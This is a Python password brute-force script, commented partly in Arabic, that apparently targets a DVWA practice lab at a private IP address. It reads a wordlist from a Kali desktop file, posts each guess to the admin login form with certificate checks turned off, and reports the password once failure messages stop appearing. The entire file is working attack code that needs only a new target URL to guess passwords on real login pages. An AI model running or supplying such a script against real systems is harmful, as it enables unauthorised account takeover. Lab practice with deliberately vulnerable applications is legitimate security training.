import requests

# تجاهل تحذيرات شهادة SSL (لأن الهدف HTTPS محلي)
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) 

target_url = "https://192.168.1.123/dvwa/login.php"

# بيانات الدخول الأساسية (كلمة المرور هتتغير في الحلقة)
data_dictionary = {
    "username": "admin",
    "password": "",
    "login": "submit"
}

print("[*] Starting the attack on the account admin...")
print("[*] Words are being tested from a file passwords.txt")

# عداد للمحاولات
attempt_count = 0

with open("/home/kali/Desktop/passwords.txt", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()  # إزالة المسافات والأسطر الجديدة
        data_dictionary["password"] = word
        attempt_count += 1
        
        try:
            # إرسال طلب POST مع تجاهل التحقق من SSL (verify=False)
            response = requests.post(
                target_url, 
                data=data_dictionary,
                verify=False,  # عشان الشهادة الذاتية على الـ 192.168.x.x
                timeout=5       # مهلة 5 ثواني عشان البرنامج ما يعلق
            )
            
            # طباعة رقم المحاولة والكلمة اللي بتحاولها (مفيد للمتابعة)
            print(f"[*] محاولة #{attempt_count}: تجربة '{word}'")
            
            # التحقق من نجاح الدخول
            # بعض النسخ من DVWA بتستخدم "Login failed" وبعضها "Username and/or password incorrect"
            if "Login failed" not in response.text and "incorrect" not in response.text:
                print("\n[+] نجحنا! كلمة المرور الصحيحة --> " + word)
                print(f"[+] تم بعد {attempt_count} محاولة")
                
                # اختياري: طباعة جزء من الرد للتأكيد
                print("\n[*] Server response extract:")
                print(response.text[:500])
                
                exit()
                
        except requests.exceptions.Timeout:
            print(f"[-] time limit: The server did not respond to the request. '{word}'")
        except requests.exceptions.ConnectionError:
            print("[-] Connection failed. Please ensure the server is running and the address is correct.")
            exit()
        except Exception as e:
            print(f"[-] Unexpected error: {e}")

print(f"\n[+] The program has ended. It has been tested. {attempt_count} We couldn't find the correct password..")
